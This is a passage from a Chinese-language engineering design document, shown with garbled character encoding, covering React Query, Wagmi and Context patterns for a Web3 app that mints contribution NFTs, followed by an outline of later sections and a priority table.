    // å¤±è´¥ï¼šå›æ»š
    onError: (error, id, context) => {
      queryClient.setQueryData(['contribution', id], context?.previous);
      toast.error('ç‚¹èµå¤±è´¥');
    },
  });
}

// ä¸é€‚åˆåœºæ™¯ï¼šæ“ä½œæˆåŠŸç‡ä½ï¼Œå¤±è´¥æˆæœ¬é«˜
function useMintContribution() {
  // âŒ ä¸è¦ä¹è§‚æ›´æ–°é“¸é€ çŠ¶æ€
  // åŸå› ï¼š
  // - é“¸é€ å¯èƒ½å¤±è´¥ï¼ˆGas ä¸è¶³ã€åˆçº¦ revertï¼‰
  // - å¤±è´¥åå›æ»šä¼šè®©ç”¨æˆ·å›°æƒ‘
  // - çŠ¶æ€å¤æ‚ï¼ˆpending â†’ minting â†’ mintedï¼‰
  
  return useMutation({
    mutationFn: async (id: string) => {
      return await fetch(`/api/contributions/${id}/mint`, { method: 'POST' });
    },
    
    // âœ… ä¸ä½¿ç”¨ onMutateï¼ˆä¸ä¹è§‚æ›´æ–°ï¼‰
    // ç­‰åç«¯è¿”å›æˆåŠŸåå†æ›´æ–° UI
    
    onSuccess: (data, id) => {
      // æˆåŠŸåå†æ›´æ–°
      queryClient.setQueryData(['contribution', id], (old: any) => ({
        ...old,
        status: 'minted',
        tokenId: data.tokenId,
      }));
      
      toast.success('é“¸é€ æˆåŠŸï¼');
    },
  });
}
```

**æŒ‘æˆ˜ 3ï¼šé”™è¯¯è¾¹ç•Œä¸ä¼˜é›…é™çº§**

```typescript
// åœºæ™¯ï¼šé“¾ä¸ŠæŸ¥è¯¢å¤±è´¥ï¼Œä¸åº”è¯¥å¯¼è‡´æ•´ä¸ªé¡µé¢å´©æºƒ

// âŒ æ²¡æœ‰é”™è¯¯å¤„ç†
function ContributionCard({ contribution }) {
  // å¦‚æœåˆçº¦åœ°å€æ— æ•ˆï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå¯¼è‡´é¡µé¢å´©æºƒ
  const { data: owner } = useReadContract({
    address: process.env.NEXT_PUBLIC_COMMIT_NFT_ADDRESS,
    abi: CommitNFTABI,
    functionName: 'ownerOf',
    args: [BigInt(contribution.tokenId)],
  });
  
  return <div>Owner: {owner}</div>;
}

// âœ… ä¼˜é›…é™çº§
function ContributionCard({ contribution }) {
  const { data: owner, error, isError } = useReadContract({
    address: process.env.NEXT_PUBLIC_COMMIT_NFT_ADDRESS,
    abi: CommitNFTABI,
    functionName: 'ownerOf',
    args: contribution.tokenId ? [BigInt(contribution.tokenId)] : undefined,
    query: {
      enabled: !!contribution.tokenId,  // ä»…å½“æœ‰ tokenId æ—¶æŸ¥è¯¢
      retry: 2,  // å¤±è´¥é‡è¯• 2 æ¬¡
    },
  });
  
  // é”™è¯¯å¤„ç†
  if (isError) {
    console.error('æŸ¥è¯¢ NFT æ‰€æœ‰è€…å¤±è´¥:', error);
    
    // é™çº§ï¼šæ˜¾ç¤ºæ•°æ®åº“ä¸­çš„ä¿¡æ¯
    return (
      <div>
        <p>çŠ¶æ€: {contribution.status}</p>
        <p className="text-gray-500">
          ï¼ˆé“¾ä¸Šæ•°æ®åŠ è½½å¤±è´¥ï¼Œæ˜¾ç¤ºæ•°æ®åº“ç¼“å­˜ï¼‰
        </p>
      </div>
    );
  }
  
  // æ­£å¸¸æ˜¾ç¤º
  return <div>Owner: {owner || 'åŠ è½½ä¸­...'}</div>;
}

// å…¨å±€é”™è¯¯è¾¹ç•Œ
// app/error.tsx
'use client';

export default function Error({
  error,
  reset,
}: {
  error: Error & { digest?: string };
  reset: () => void;
}) {
  useEffect(() => {
    console.error('é¡µé¢é”™è¯¯:', error);
  }, [error]);
  
  return (
    <div className="error-container">
      <h2>å‡ºé”™äº†ï¼</h2>
      <p>{error.message}</p>
      <button onClick={reset}>é‡è¯•</button>
      <button onClick={() => window.location.href = '/'}>è¿”å›é¦–é¡µ</button>
    </div>
  );
}
```

**æŒ‘æˆ˜ 4ï¼šé’±åŒ…åˆ‡æ¢åçš„çŠ¶æ€åŒæ­¥**

```typescript
// åœºæ™¯ï¼šç”¨æˆ·åˆ‡æ¢äº†é’±åŒ…åœ°å€

function MyComponent() {
  const { address } = useAccount();
  const queryClient = useQueryClient();
  
  // ç›‘å¬åœ°å€å˜åŒ–
  useEffect(() => {
    if (address) {
      console.log('é’±åŒ…åœ°å€å˜åŒ–:', address);
      
      // æ¸…é™¤æ‰€æœ‰ä¸åœ°å€ç›¸å…³çš„ç¼“å­˜
      queryClient.invalidateQueries({ 
        queryKey: ['my-contributions'] 
      });
      queryClient.invalidateQueries({ 
        queryKey: ['contribution-stats', address] 
      });
      queryClient.invalidateQueries({ 
        queryKey: ['agent-profile', address] 
      });
      
      // é‡æ–°æ£€æŸ¥æ³¨å†ŒçŠ¶æ€
      checkRegistration();
    }
  }, [address, queryClient]);
  
  return <div>...</div>;
}

// æ›´ä¼˜é›…çš„æ–¹æ¡ˆï¼šå…¨å±€ç›‘å¬
// app/providers.tsx
function Providers({ children }) {
  const { address } = useAccount();
  const queryClient = useQueryClient();
  const previousAddress = useRef(address);
  
  useEffect(() => {
    // æ£€æµ‹åˆ°åœ°å€å˜åŒ–
    if (address && address !== previousAddress.current) {
      console.log('é’±åŒ…åˆ‡æ¢:', previousAddress.current, '->', address);
      
      // æ¸…é™¤æ‰€æœ‰ç¼“å­˜ï¼ˆé‡æ–°å¼€å§‹ï¼‰
      queryClient.clear();
      
      // æ˜¾ç¤ºé€šçŸ¥
      toast.info('é’±åŒ…å·²åˆ‡æ¢ï¼Œæ•°æ®å·²åˆ·æ–°');
      
      previousAddress.current = address;
    }
  }, [address, queryClient]);
  
  return (
    <RainbowKitProvider>
      <Web3Provider>
        {children}
      </Web3Provider>
    </RainbowKitProvider>
  );
}
```

**æŒ‘æˆ˜ 5ï¼šç½‘ç»œåˆ‡æ¢åçš„åˆçº¦åœ°å€æ›´æ–°**

```typescript
// é—®é¢˜ï¼šä¸åŒç½‘ç»œçš„åˆçº¦åœ°å€ä¸åŒ

// å½“å‰é—®é¢˜ï¼šç¡¬ç¼–ç å•ä¸€åˆçº¦åœ°å€
const contractAddress = process.env.NEXT_PUBLIC_COMMIT_NFT_ADDRESS;

// ä½†åœ¨ä¸åŒç½‘ç»œéƒ¨ç½²äº†ä¸åŒçš„åˆçº¦ï¼š
// - Hardhat Local (31337): 0x5FbDB2315678afecb367f032d93F642f64180aa3
// - Sepolia (11155111): 0x7a2088a1bFc9d81c55368AE168C2C02570cB814F
// - Mainnet (1): 0x...

// è§£å†³æ–¹æ¡ˆï¼šæŒ‰ chainId é€‰æ‹©åœ°å€
const contractAddresses = {
  31337: '0x5FbDB2315678afecb367f032d93F642f64180aa3',      // Hardhat
  11155111: '0x7a2088a1bFc9d81c55368AE168C2C02570cB814F',  // Sepolia
  1: '0x...',                                               // Mainnet
} as const;

function useContractAddress(contractName: 'CommitNFT' | 'ReputationRegistry') {
  const chainId = useChainId();
  
  // æ ¹æ®å½“å‰ç½‘ç»œè¿”å›å¯¹åº”åœ°å€
  const address = useMemo(() => {
    if (contractName === 'CommitNFT') {
      return contractAddresses[chainId as keyof typeof contractAddresses];
    }
    // ...
  }, [chainId, contractName]);
  
  return address;
}

// ä½¿ç”¨ï¼š
function MintButton() {
  const contractAddress = useContractAddress('CommitNFT');
  const { writeContract } = useWriteContract();
  
  const handleMint = () => {
    writeContract({
      address: contractAddress,  // â† è‡ªåŠ¨æ ¹æ®ç½‘ç»œé€‰æ‹©
      abi: CommitNFTABI,
      functionName: 'mintCommit',
      args: [to, commitData, metadataUri],
    });
  };
  
  return <button onClick={handleMint}>é“¸é€ </button>;
}

// æˆ–è€…ï¼šä½¿ç”¨é…ç½®æ–‡ä»¶
// lib/contracts/addresses.ts
export const CONTRACTS = {
  CommitNFT: {
    31337: '0x5FbDB2315678afecb367f032d93F642f64180aa3',
    11155111: '0x7a2088a1bFc9d81c55368AE168C2C02570cB814F',
    1: '0x...',
  },
  ReputationRegistry: {
    31337: '0x...',
    11155111: '0x...',
    1: '0x...',
  },
} as const;

export function getContractAddress(
  name: keyof typeof CONTRACTS,
  chainId: number
): `0x${string}` | undefined {
  return CONTRACTS[name][chainId as keyof typeof CONTRACTS[typeof name]];
}
```

**æŒ‘æˆ˜ 6ï¼šSkeleton åŠ è½½ä¸æ•°æ®é¢„åŠ è½½**

```typescript
// ä¼˜åŒ–ï¼šåœ¨ç”¨æˆ·å¯èƒ½è®¿é—®çš„é¡µé¢å‰é¢„åŠ è½½æ•°æ®

import { useQueryClient } from '@tanstack/react-query';

function ContributionsList() {
  const queryClient = useQueryClient();
  const { data: contributions, isLoading } = useContributions();
  
  // é¢„åŠ è½½ï¼šé¼ æ ‡æ‚¬åœæ—¶é¢„åŠ è½½è¯¦æƒ…
  const handleMouseEnter = (contributionId: string) => {
    // é¢„å–æ•°æ®ï¼ˆä¸ä¼šè§¦å‘ loading çŠ¶æ€ï¼‰
    queryClient.prefetchQuery({
      queryKey: ['contribution', contributionId],
      queryFn: () => contributionsApi.getOne(contributionId),
    });
  };
  
  if (isLoading) {
    // ä½¿ç”¨ Skeleton è€Œé Spinnerï¼ˆæ›´å¥½çš„ä½“éªŒï¼‰
    return (
      <div className="space-y-4">
        {[1, 2, 3, 4, 5].map(i => (
          <div key={i} className="animate-pulse">
            <div className="h-4 bg-gray-200 rounded w-3/4 mb-2"></div>
            <div className="h-4 bg-gray-200 rounded w-1/2"></div>
          </div>
        ))}
      </div>
    );
  }
  
  return (
    <div>
      {contributions.map(c => (
        <div 
          key={c.id}
          onMouseEnter={() => handleMouseEnter(c.id)}  // â† é¢„åŠ è½½
        >
          <Link href={`/contributions/${c.id}`}>
            {c.title}
          </Link>
        </div>
      ))}
    </div>
  );
}
```

**æŒ‘æˆ˜ 7ï¼šäº¤æ˜“è¿›åº¦çš„å¯è§†åŒ–**

```typescript
// å¤æ‚äº¤æ˜“æµç¨‹çš„è¿›åº¦å±•ç¤º

function MintFlowWithProgress({ contributionId }) {
  const [currentStep, setCurrentStep] = useState(1);
  const [progress, setProgress] = useState(0);
  
  // æ­¥éª¤ 1ï¼šè¯„åˆ†ä¸ç­¾å
  const handleStep1 = async () => {
    setProgress(0);
    toast.loading('è¯„åˆ†ä¸­...', { id: 'scoring' });
    
    setProgress(20);
    const score = await calculateScore(contribution);
    
    setProgress(40);
    const signature = await signScore(score);
    
    setProgress(60);
    toast.dismiss('scoring');
    toast.success('ç­¾åå®Œæˆ');
    
    setProgress(100);
    setCurrentStep(2);
  };
  
  // æ­¥éª¤ 2ï¼šæäº¤è¯„åˆ†
  const handleStep2 = async () => {
    setProgress(0);
    toast.loading('æäº¤è¯„åˆ†åˆ°é“¾ä¸Š...', { id: 'submit' });
    
    setProgress(30);
    const { writeContract } = useWriteContract();
    
    setProgress(50);
    const hash = await writeContract({
      address: reputationRegistryAddress,
      abi: ReputationRegistryABI,
      functionName: 'submitFeedback',
      args: [params, signature],
    });
    
    setProgress(70);
    toast.dismiss('submit');
    toast.loading('ç­‰å¾…åŒºå—ç¡®è®¤...', { id: 'confirm' });
    
    // ç­‰å¾…ç¡®è®¤
    await waitForReceipt(hash);
    
    setProgress(100);
    toast.dismiss('confirm');
    toast.success('è¯„åˆ†å·²ä¸Šé“¾');
    
    setCurrentStep(3);
  };
  
  // æ­¥éª¤ 3ï¼šé“¸é€  NFT
  const handleStep3 = async () => {
    // ç±»ä¼¼æ­¥éª¤ 2
  };
  
  return (
    <div>
      {/* æ­¥éª¤æŒ‡ç¤ºå™¨ */}
      <div className="flex justify-between mb-8">
        <Step number={1} title="è¯„åˆ†ä¸ç­¾å" active={currentStep === 1} completed={currentStep > 1} />
        <Step number={2} title="æäº¤è¯„åˆ†" active={currentStep === 2} completed={currentStep > 2} />
        <Step number={3} title="é“¸é€  NFT" active={currentStep === 3} completed={currentStep > 3} />
      </div>
      
      {/* è¿›åº¦æ¡ */}
      <ProgressBar value={progress} />
      
      {/* å½“å‰æ­¥éª¤ */}
      {currentStep === 1 && <button onClick={handleStep1}>å¼€å§‹è¯„åˆ†</button>}
      {currentStep === 2 && <button onClick={handleStep2}>æäº¤è¯„åˆ†</button>}
      {currentStep === 3 && <button onClick={handleStep3}>é“¸é€  NFT</button>}
    </div>
  );
}
```

**æŒ‘æˆ˜ 8ï¼šæ–­ç½‘é‡è¿åçš„çŠ¶æ€æ¢å¤**

```typescript
// åœºæ™¯ï¼šç”¨æˆ·åœ¨é“¸é€ è¿‡ç¨‹ä¸­æ–­ç½‘

function useOnlineStatus() {
  const [isOnline, setIsOnline] = useState(true);
  
  useEffect(() => {
    const handleOnline = () => {
      setIsOnline(true);
      toast.success('ç½‘ç»œå·²æ¢å¤');
    };
    
    const handleOffline = () => {
      setIsOnline(false);
      toast.error('ç½‘ç»œå·²æ–­å¼€');
    };
    
    window.addEventListener('online', handleOnline);
    window.addEventListener('offline', handleOffline);
    
    return () => {
      window.removeEventListener('online', handleOnline);
      window.removeEventListener('offline', handleOffline);
    };
  }, []);
  
  return isOnline;
}

// åœ¨é“¸é€ æµç¨‹ä¸­ä½¿ç”¨
function MintButton({ contributionId }) {
  const isOnline = useOnlineStatus();
  const queryClient = useQueryClient();
  
  const { writeContract, isPending } = useWriteContract();
  
  // ç›‘å¬ç½‘ç»œæ¢å¤
  useEffect(() => {
    if (isOnline && isPending) {
      // ç½‘ç»œæ¢å¤ï¼Œæ£€æŸ¥äº¤æ˜“çŠ¶æ€
      const contribution = queryClient.getQueryData(['contribution', contributionId]);
      
      if (contribution?.transactionHash) {
        // æœ‰ hashï¼Œç»§ç»­ç­‰å¾…ç¡®è®¤
        toast.info('ç½‘ç»œå·²æ¢å¤ï¼Œç»§ç»­ç­‰å¾…äº¤æ˜“ç¡®è®¤...');
      }
    }
  }, [isOnline, isPending]);
  
  return (
    <div>
      {!isOnline && (
        <div className="bg-yellow-100 p-2 mb-2">
          âš ï¸ ç½‘ç»œå·²æ–­å¼€ï¼Œè¯·æ£€æŸ¥ç½‘ç»œè¿æ¥
        </div>
      )}
      
      <button 
        onClick={() => writeContract({ ... })}
        disabled={!isOnline || isPending}
      >
        {isPending ? 'é“¸é€ ä¸­...' : 'é“¸é€  NFT'}
      </button>
    </div>
  );
}
```

---

### 6.4 æ€§èƒ½ä¼˜åŒ–é—®é¢˜

#### æŒ‘æˆ˜ 1ï¼šè™šæ‹Ÿæ»šåŠ¨ï¼ˆå¤§åˆ—è¡¨ä¼˜åŒ–ï¼‰

```typescript
// åœºæ™¯ï¼šç”¨æˆ·æœ‰ 1000+ ä¸ªè´¡çŒ®è®°å½•

// âŒ ä¸€æ¬¡æ€§æ¸²æŸ“æ‰€æœ‰ï¼ˆæ€§èƒ½å·®ï¼‰
function ContributionsList() {
  const { data: contributions } = useContributions();
  
  return (
    <div>
      {contributions?.map(c => (
        <ContributionCard key={c.id} contribution={c} />
      ))}
    </div>
  );
}

// âœ… è™šæ‹Ÿæ»šåŠ¨ï¼ˆä»…æ¸²æŸ“å¯è§éƒ¨åˆ†ï¼‰
import { useVirtualizer } from '@tanstack/react-virtual';

function ContributionsListVirtual() {
  const { data: contributions = [] } = useContributions();
  const parentRef = useRef<HTMLDivElement>(null);
  
  // é…ç½®è™šæ‹Ÿæ»šåŠ¨
  const virtualizer = useVirtualizer({
    count: contributions.length,
    getScrollElement: () => parentRef.current,
    estimateSize: () => 100,  // æ¯é¡¹ä¼°è®¡é«˜åº¦ 100px
    overscan: 5,  // é¢„æ¸²æŸ“ 5 é¡¹ï¼ˆæå‡æ»šåŠ¨æµç•…åº¦ï¼‰
  });
  
  return (
    <div ref={parentRef} className="h-screen overflow-auto">
      <div style={{ height: `${virtualizer.getTotalSize()}px` }}>
        {virtualizer.getVirtualItems().map(virtualItem => {
          const contribution = contributions[virtualItem.index];
          
          return (
            <div
              key={virtualItem.key}
              style={{
                position: 'absolute',
                top: 0,
                left: 0,
                width: '100%',
                height: `${virtualItem.size}px`,
                transform: `translateY(${virtualItem.start}px)`,
              }}
            >
              <ContributionCard contribution={contribution} />
            </div>
          );
        })}
      </div>
    </div>
  );
}

// æ€§èƒ½å¯¹æ¯”ï¼š
// - ä¼ ç»Ÿæ–¹å¼ï¼šæ¸²æŸ“ 1000 ä¸ªç»„ä»¶ â†’ å¡é¡¿
// - è™šæ‹Ÿæ»šåŠ¨ï¼šä»…æ¸²æŸ“ 10-20 ä¸ªå¯è§ç»„ä»¶ â†’ æµç•…
```

**æŒ‘æˆ˜ 2ï¼šé˜²æŠ–ä¸èŠ‚æµ**

```typescript
// åœºæ™¯ï¼šæœç´¢æ¡†å®æ—¶è¿‡æ»¤

// âŒ æ¯æ¬¡è¾“å…¥éƒ½è¯·æ±‚ï¼ˆæ€§èƒ½å·®ï¼‰
function SearchContributions() {
  const [searchTerm, setSearchTerm] = useState('');
  
  const { data: results } = useQuery({
    queryKey: ['search', searchTerm],
    queryFn: () => searchApi(searchTerm),
    enabled: searchTerm.length > 0,
  });
  
  // ç”¨æˆ·è¾“å…¥ "react" â†’ 5 æ¬¡è¯·æ±‚ï¼šr, re, rea, reac, react
  
  return (
    <input 
      value={searchTerm}
      onChange={(e) => setSearchTerm(e.target.value)}  // â† æ¯æ¬¡è¾“å…¥éƒ½è§¦å‘
    />
  );
}

// âœ… é˜²æŠ–ï¼ˆç”¨æˆ·åœæ­¢è¾“å…¥åæ‰è¯·æ±‚ï¼‰
import { useDeferredValue } from 'react';

function SearchContributionsDebounced() {
  const [searchTerm, setSearchTerm] = useState('');
  
  // React 18 çš„ useDeferredValueï¼ˆè‡ªåŠ¨é˜²æŠ–ï¼‰
  const deferredSearchTerm = useDeferredValue(searchTerm);
  
  const { data: results } = useQuery({
    queryKey: ['search', deferredSearchTerm],
    queryFn: () => searchApi(deferredSearchTerm),
    enabled: deferredSearchTerm.length > 0,
  });
  
  // æˆ–è€…ä½¿ç”¨ lodash.debounce
  const debouncedSetSearch = useCallback(
    debounce((value: string) => setSearchTerm(value), 500),  // 500ms é˜²æŠ–
    []
  );
  
  return (
    <input 
      onChange={(e) => debouncedSetSearch(e.target.value)}
      placeholder="æœç´¢è´¡çŒ®..."
    />
  );
}

// èŠ‚æµï¼ˆé™åˆ¶è¯·æ±‚é¢‘ç‡ï¼‰
import { throttle } from 'lodash';

function ScrollToLoadMore() {
  const loadMore = throttle(async () => {
    // åŠ è½½æ›´å¤šæ•°æ®
  }, 1000);  // 1 ç§’å†…æœ€å¤šæ‰§è¡Œ 1 æ¬¡
  
  useEffect(() => {
    const handleScroll = () => {
      if (window.innerHeight + window.scrollY >= document.body.offsetHeight - 100) {
        loadMore();
      }
    };
    
    window.addEventListener('scroll', handleScroll);
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);
}
```

---

### 6.5 çŠ¶æ€æŒä¹…åŒ–é—®é¢˜

#### æŒ‘æˆ˜ï¼šç”¨æˆ·åˆ·æ–°é¡µé¢åçŠ¶æ€ä¸¢å¤±

```typescript
// åœºæ™¯ï¼šç”¨æˆ·åœ¨é“¸é€ æµç¨‹ä¸­åˆ·æ–°é¡µé¢

// âŒ å½“å‰é—®é¢˜ï¼šçŠ¶æ€å…¨éƒ¨ä¸¢å¤±
function MintFlow() {
  const [step, setStep] = useState(1);  // åˆ·æ–°åå˜å› 1
  const [formData, setFormData] = useState({});  // åˆ·æ–°åä¸¢å¤±
}

// âœ… è§£å†³æ–¹æ¡ˆ Aï¼šlocalStorage æŒä¹…åŒ–
function MintFlowPersistent({ contributionId }) {
  // ä» localStorage æ¢å¤çŠ¶æ€
  const [step, setStep] = useState(() => {
    const saved = localStorage.getItem(`mint-step-${contributionId}`);
    return saved ? parseInt(saved) : 1;
  });
  
  // ä¿å­˜çŠ¶æ€åˆ° localStorage
  useEffect(() => {
    localStorage.setItem(`mint-step-${contributionId}`, step.toString());
  }, [step, contributionId]);
  
  // æ¸…ç†ï¼šå®Œæˆååˆ é™¤
  useEffect(() => {
    if (step === 4) {  // æœ€åä¸€æ­¥
      localStorage.removeItem(`mint-step-${contributionId}`);
    }
  }, [step, contributionId]);
  
  return <div>å½“å‰æ­¥éª¤: {step}</div>;
}

// âœ… è§£å†³æ–¹æ¡ˆ Bï¼šURL å‚æ•°æŒä¹…åŒ–
import { useSearchParams, useRouter } from 'next/navigation';

function MintFlowURL() {
  const searchParams = useSearchParams();
  const router = useRouter();
  
  // ä» URL è¯»å–æ­¥éª¤
  const step = parseInt(searchParams.get('step') || '1');
  
  // æ›´æ–°æ­¥éª¤ï¼ˆåŒæ—¶æ›´æ–° URLï¼‰
  const setStep = (newStep: number) => {
    router.push(`?step=${newStep}`, { scroll: false });
  };
  
  // å¥½å¤„ï¼š
  // - åˆ·æ–°é¡µé¢ä¿æŒçŠ¶æ€
  // - å¯ä»¥åˆ†äº«é“¾æ¥ï¼ˆåŒ…å«è¿›åº¦ï¼‰
  // - æµè§ˆå™¨å‰è¿›/åé€€æ”¯æŒ
  
  return <div>å½“å‰æ­¥éª¤: {step}</div>;
}

// âœ… è§£å†³æ–¹æ¡ˆ Cï¼šæ•°æ®åº“æŒä¹…åŒ–ï¼ˆæœ€å¯é ï¼‰
// å‰é¢æåˆ°çš„ MintProgress æ–¹æ¡ˆ
```

---

### 6.6 Context è¿‡åº¦ä½¿ç”¨é—®é¢˜

#### é—®é¢˜æè¿°

è¿‡åº¦ä½¿ç”¨ Context ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜å’Œä¸å¿…è¦çš„é‡æ¸²æŸ“ã€‚

```typescript
// âŒ åæ¨¡å¼ï¼šæ‰€æœ‰çŠ¶æ€éƒ½æ”¾åœ¨ä¸€ä¸ªå¤§ Context

const AppContext = createContext();

function AppProvider({ children }) {
  const [user, setUser] = useState(null);
  const [contributions, setContributions] = useState([]);
  const [stats, setStats] = useState(null);
  const [theme, setTheme] = useState('light');
  const [sidebarOpen, setSidebarOpen] = useState(false);
  // ...æ›´å¤šçŠ¶æ€
  
  const value = {
    user, setUser,
    contributions, setContributions,
    stats, setStats,
    theme, setTheme,
    sidebarOpen, setSidebarOpen,
    // ...æ›´å¤š
  };
  
  // é—®é¢˜ï¼š
  // 1. ä»»ä½•ä¸€ä¸ªçŠ¶æ€å˜åŒ–ï¼Œæ‰€æœ‰ä½¿ç”¨ useContext(AppContext) çš„ç»„ä»¶éƒ½ä¼šé‡æ¸²æŸ“
  // 2. å¦‚æœ 100 ä¸ªç»„ä»¶éƒ½ç”¨äº†è¿™ä¸ª Contextï¼Œæ€§èƒ½ä¼šå¾ˆå·®
  
  return <AppContext.Provider value={value}>{children}</AppContext.Provider>;
}

// âœ… æ­£ç¡®ï¼šæ‹†åˆ† Contextï¼ŒæŒ‰èŒè´£åˆ†ç¦»

// 1. ç”¨æˆ· Contextï¼ˆè®¤è¯ç›¸å…³ï¼‰
const UserContext = createContext();

function UserProvider({ children }) {
  const { data: user } = useQuery({
    queryKey: ['user'],
    queryFn: AuthService.getUser,
  });
  
  return <UserContext.Provider value={user}>{children}</UserContext.Provider>;
}

// 2. ä¸»é¢˜ Contextï¼ˆUI ç›¸å…³ï¼‰
const ThemeContext = createContext();

function ThemeProvider({ children }) {
  const [theme, setTheme] = useState('light');
  return <ThemeContext.Provider value={{ theme, setTheme }}>{children}</ThemeContext.Provider>;
}

// 3. ä¾§è¾¹æ  Contextï¼ˆå¸ƒå±€ç›¸å…³ï¼‰
const SidebarContext = createContext();

function SidebarProvider({ children }) {
  const [isOpen, setIsOpen] = useState(false);
  return <SidebarContext.Provider value={{ isOpen, setIsOpen }}>{children}</SidebarContext.Provider>;
}

// ç»„ä»¶åªè®¢é˜…éœ€è¦çš„ Context
function Sidebar() {
  const { isOpen } = useContext(SidebarContext);  // åªç›‘å¬ sidebar çŠ¶æ€
  // ä¸ä¼šå› ä¸º theme å˜åŒ–è€Œé‡æ¸²æŸ“
  return <div>{isOpen && '...'}</div>;
}

// ä¼˜ç‚¹ï¼š
// - æ€§èƒ½æ›´å¥½ï¼ˆå‡å°‘ä¸å¿…è¦çš„é‡æ¸²æŸ“ï¼‰
// - ä»£ç æ›´æ¸…æ™°ï¼ˆèŒè´£åˆ†ç¦»ï¼‰
// - æ˜“äºç»´æŠ¤
```

---

### 6.7 æ€»ç»“ä¸æœ€ä½³å®è·µ

#### çŠ¶æ€ç®¡ç†å†³ç­–æ ‘

```
æ•°æ®æ¥è‡ªå“ªé‡Œï¼Ÿ
â”œâ”€ æœåŠ¡ç«¯ï¼ˆAPI/æ•°æ®åº“ï¼‰
â”‚  â””â”€ ä½¿ç”¨ React Query
â”‚      - useContributions()
â”‚      - useAuth()
â”‚
â”œâ”€ åŒºå—é“¾ï¼ˆæ™ºèƒ½åˆçº¦ï¼‰
â”‚  â””â”€ ä½¿ç”¨ Wagmi Hooks
â”‚      - useReadContract()
â”‚      - useWriteContract()
â”‚
â”œâ”€ å…¨å±€å…±äº«ï¼ˆå¤šä¸ªç»„ä»¶ï¼‰
â”‚  â””â”€ ä½¿ç”¨ Context API
â”‚      - UserContext
â”‚      - ThemeContext
â”‚
â””â”€ ç»„ä»¶æœ¬åœ°ï¼ˆå•ä¸ªç»„ä»¶ï¼‰
   â””â”€ ä½¿ç”¨ useState
       - è¡¨å•è¾“å…¥
       - Modal å¼€å…³
```

#### æ€§èƒ½ä¼˜åŒ–æ¸…å•

| ä¼˜åŒ–é¡¹ | å®ç°æ–¹å¼ | æ”¶ç›Š |
|-------|---------|------|
| **æ•°æ®ç¼“å­˜** | React Query | å‡å°‘ API è¯·æ±‚ |
| **è™šæ‹Ÿæ»šåŠ¨** | @tanstack/react-virtual | å¤§åˆ—è¡¨æµç•… |
| **é˜²æŠ–èŠ‚æµ** | lodash/useDeferredValue | å‡å°‘è®¡ç®— |
| **ä»£ç åˆ†å‰²** | dynamic import | é¦–å±åŠ è½½å¿« |
| **é¢„åŠ è½½** | prefetchQuery | æå‡ä½“éªŒ |
| **éª¨æ¶å±** | Skeleton | å‡å°‘ç™½å± |
| **ä¹è§‚æ›´æ–°** | onMutate | æ“ä½œå³æ—¶åé¦ˆ |
| **é”™è¯¯è¾¹ç•Œ** | Error Boundary | å±€éƒ¨é”™è¯¯ä¸å´©æºƒ |

#### æ¨èæ¶æ„

```typescript
// app/providers.tsx
export function Providers({ children }) {
  return (
    // 1. RainbowKitï¼ˆWagmi + QueryClientï¼‰
    <RainbowKitProvider>
      {/* 2. Web3 Contextï¼ˆå°è£… Wagmiï¼‰*/}
      <Web3Provider>
        {/* 3. åº”ç”¨å†…å®¹ */}
        {children}
        
        {/* 4. å…¨å±€ç»„ä»¶ */}
        <Toaster />
        <NetworkSwitchModal />
        <WalletConnectModal />
      </Web3Provider>
    </RainbowKitProvider>
  );
}

// ç»„ä»¶å±‚ï¼šç»„åˆä½¿ç”¨
function MyPage() {
  // React Queryï¼šæœåŠ¡ç«¯çŠ¶æ€
  const { data: contributions } = useContributions();
  
  // Wagmiï¼šé“¾ä¸ŠçŠ¶æ€
  const { address, isConnected } = useWeb3();
  
  // useStateï¼šç»„ä»¶æœ¬åœ°çŠ¶æ€
  const [selectedId, setSelectedId] = useState(null);
  
  return <div>...</div>;
}
```

è¿™æ ·çš„æ¶æ„æ¸…æ™°ã€é«˜æ•ˆã€æ˜“äºç»´æŠ¤ï¼ğŸš€

---

## ä¸ƒã€API è®¾è®¡é—®é¢˜ ğŸŒ

### 7.1 è¯·æ±‚éªŒè¯ä¸æˆæƒ
### 7.2 é”™è¯¯å¤„ç†ç»Ÿä¸€æ€§
### 7.3 API æ€§èƒ½ä¼˜åŒ–

---

## å…«ã€æ•°æ®åº“è®¾è®¡é—®é¢˜ ğŸ—„ï¸

### 8.1 RLS ç­–ç•¥å¤æ‚æ€§
### 8.2 æ•°æ®è¿ç§»ç®¡ç†
### 8.3 æŸ¥è¯¢æ€§èƒ½ä¼˜åŒ–

---

## ä¹ã€å®‰å…¨æ€§é—®é¢˜ ğŸ›¡ï¸

### 9.1 å‰ç«¯å®‰å…¨
### 9.2 åç«¯å®‰å…¨
### 9.3 æ™ºèƒ½åˆçº¦å®‰å…¨

---

## åã€é”™è¯¯å¤„ç†ä¸å®¹é”™é—®é¢˜ âš ï¸

### 10.1 å¤–éƒ¨æœåŠ¡ä¾èµ–
### 10.2 å¼‚æ­¥ä»»åŠ¡ç®¡ç†
### 10.3 æ—¥å¿—ä¸ç›‘æ§

---

## åä¸€ã€æ€§èƒ½ä¸æ‰©å±•æ€§é—®é¢˜ ğŸš€

### 11.1 å¹¶å‘å¤„ç†èƒ½åŠ›
### 11.2 æ•°æ®å¢é•¿
### 11.3 æ¨ªå‘æ‰©å±•

---

## åäºŒã€å¼€å‘ä½“éªŒé—®é¢˜ ğŸ› ï¸

### 12.1 ç¯å¢ƒé…ç½®å¤æ‚æ€§
### 12.2 ç±»å‹å®‰å…¨
### 12.3 æµ‹è¯•è¦†ç›–ç‡

---

## é™„å½•ï¼šé—®é¢˜ä¼˜å…ˆçº§çŸ©é˜µ

| é—®é¢˜é¢†åŸŸ | å½±å“èŒƒå›´ | å¤æ‚åº¦ | ä¼˜å…ˆçº§ | å½“å‰çŠ¶æ€ |
|---------|---------|--------|--------|---------|
| 1.1 åŒé‡èº«ä»½ç»‘å®š | æ ¸å¿ƒåŠŸèƒ½ | é«˜ | P0 | âš ï¸ éœ€ä¼˜åŒ– |
| 1.2 Session ç®¡ç† | å®‰å…¨æ€§ | ä¸­ | P1 | âš ï¸ éœ€ä¼˜åŒ– |
| 1.3 å¤šç«¯çŠ¶æ€åŒæ­¥ | ç”¨æˆ·ä½“éªŒ | é«˜ | P1 | âš ï¸ éœ€ä¼˜åŒ– |
| 1.4 Access Token ç®¡ç† | åŠŸèƒ½æ‰©å±• | ä¸­ | P2 | ğŸ“‹ å¾…å®ç° |
